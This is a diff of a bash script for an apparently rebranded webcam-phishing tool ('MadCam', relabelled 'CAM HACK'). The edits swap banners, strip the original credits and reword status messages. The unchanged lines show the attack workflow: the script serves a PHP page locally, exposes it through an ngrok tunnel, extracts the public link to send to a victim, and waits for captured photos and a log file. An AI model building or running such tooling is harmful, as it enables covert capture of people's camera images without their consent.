@@ -5,15 +5,9 @@ clear
 printf "\n"
 printf "\n"
 printf "\n"
-echo '
-                              mmmm
-                        so++++oooooo++++osydmM
-                   +ooyhdmNNNNNNNNNNNNmmhyoo++oy    
-                             NNNNNNNN 
-                  ---------------------------------  
-                 !!        𝐌ʳ. 𝐦𝓐𝓓 ⓑｈⓐι       !! 
-                  ---------------------------------                  ' | lolcat
-sleep 5
+echo ''
+bash Logo.sh
+sleep 7
 clear
 echo "                NGROK PLEASE TURN ON YOUR HOTSPOT 
                OTHERWISE YOU DONT GET LINK...!"
@@ -52,27 +46,23 @@ trap 'printf "\n";stop' 2
 
 banner() {
 
-echo '
-           ___        .---------.._
-    ______!gnm!_....-" .g8888888p. "-------....._
-  ."          //     .g8:       :8p..---....___ \".
-  | MADCAM   //  ()  d88:       :88b|==========! !|
-  |  V1.1   //       888:       :888|==========| !|
-  |___      \\_______"T88888888888P""----------"//|   
-  |   \       """"""""""""""""""""""""""""""""""/ |   
-  |    !...._____      .="""=.   .[]    ____...!  |   
-  |   / This Script   ! .g$p. !   .[]          :  |   
-  |  ! is Reborn as  :  $$$$$  :  .[]          :  |   
-  |  !    MadCam     ! "T$P" !   .[]           . |   
-  |   \__              "=._.="   .()        __    |   
-  |.--'  '----._______________________.----'  '--.|
-  ".________________MR._MAD_BHAI_________________." ' |lolcat
+echo ""
+echo "" \e[33m \n"
+   ██████  ███████ ███    ███        
+   ██      ██   ██ ████  ████        
+   ██      ███████ ██ ████ ██        
+   ██      ██   ██ ██  ██  ██        
+   ██████  ██   ██ ██      ██        
+                                     
+   \e[95m                                     
+        ██   ██  █████   ██████ ██   ██  
+        ██   ██ ██   ██ ██      ██  ██    
+        ███████ ███████ ██      █████     
+        ██   ██ ██   ██ ██      ██  ██    
+        ██   ██ ██   ██  ██████ ██   ██   
+                                     \e[0m \n"
                                                                               
 echo " "
-printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m]Script link  :\e[0m\e[1;77m %s\e[0m\n https://www.github.com/MrMadBhai/MadCam"
-printf "\n"
-printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m]Instagram ID :\e[0m\e[1;77m %s\e[0m\n https://www.instagram.com/MrMadBhai"
-printf "\n"
 
 }
 
@@ -135,7 +125,7 @@ if [[ -e "Log.log" ]]; then
 echo ""
 echo '
      ---------------------------   
-   !      CAM FILE RECEIVED      ! 
+    !    PHOTOS FILE RECEIVED   ! 
      ---------------------------   ' | lolcat
 rm -rf Log.log
 fi
@@ -231,17 +221,15 @@ fi
 fi
 
 echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
-echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !   PHP SERVER NOW STARTING   !  \e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m   !  PHP Server Now Starting  !  \e[0m'
 echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
 echo ""
 php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
 echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
-echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m  !  NGROK SERVER NOW STARTING  !  \e[0m'
+echo -e $'\e[1;91m\e[0m\e[1;33m\e[0m\e[1;90m\e[0m\e[1;92m   !    Manually Start Ngrok   !  \e[0m'
 echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m   ---------------------------    \e[0m'
 echo ""
-
-
 echo ""
 echo -e "\e[91m[\e[92m*\e[91m]\e[1;93m Open New Session (tab) Type This Command :\e[0m\e[1;36m ./ngrok http 3333  "
 echo ""
@@ -254,7 +242,7 @@ echo""
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m[\e[0m*\e[1;92m] Link Chack Your New Tab Open Ngrok \e[0m\e[1;77m %s\e[0m\n" $link
 
 payload_ngrok
 checkfound
